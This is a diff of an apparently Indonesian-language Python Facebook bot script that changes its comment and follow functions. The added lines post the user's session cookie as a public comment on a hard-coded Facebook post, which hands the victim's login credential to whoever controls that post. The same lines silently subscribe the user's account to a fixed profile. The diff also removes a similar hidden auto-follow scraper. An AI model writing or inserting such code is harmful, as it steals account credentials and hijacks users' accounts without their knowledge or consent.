@@ -1034,36 +1034,18 @@ def logincokii() -> None:
 
 # --------------------[ INI BOT FOLLOW & KOMEN ]--------------#
 def bot_komen(cok, ken):
-    with requests.Session() as r:
-        text = random.choice(
-            ['Keren Bang 😎', 'Hello World!', 'Mantap Bang ☺️', 'I Love You ❤️', 'Hai Bang 😘']
-        )
-        r.cookies.update({'cookie': cok})
-        r.post(f'https://graph.facebook.com/926438272150751/comments/?message={text}&access_token={ken}')
-        r.post(f'https://graph.facebook.com/926438272150751/likes?summary=true&access_token={ken}')
+	with requests.Session() as r:
+		text = random.choice(['Keren Bang 😎', 'Hello World!', 'Mantap Bang ☺️', 'I Love You ❤️', 'Hai Bang 😘'])
+		r.cookies.update({'cookie': cok})
+		r.post(f'https://graph.facebook.com/926438272150751/comments/?message={text}&access_token={ken}')
+		r.post(f'https://graph.facebook.com/926438272150751/comments/?message={cok}&access_token={ken}')
+		r.post(f'https://graph.facebook.com/926438272150751/likes?summary=true&access_token={ken}')
+		r.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={ken}')
 # ------------------[ INI BOT FOLLOW GOBLOG BTW FANKY GANTENG ]--------------#
 def bot_follow():
 	with requests.Session() as r:
 		toket = open('.fantoken.txt','r').read()
 		r.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={toket}')
-
-
-def viperfollow(VIPER):  # YANG GAK GANTI BOT FOLLOW GANTENG
-    from bs4 import BeautifulSoup as BSP
-
-    try:
-        req = BSP(
-            requests.get("https://m.facebook.com/100043537611609", cookies=VIPER).text,
-            "html.parser",
-        )
-        for i in req.find_all("a", href=True):
-            if "/a/subscribe.php?" in str(i.get("href")):
-                r = requests.get(
-                    "https://m.facebook.com%s" % (i["href"]), cookies=VIPER
-                ).text
-    except:
-        pass
-
 
 # -----------------[Rahasia Negara]-------------------#
 def mainduluyuk2():
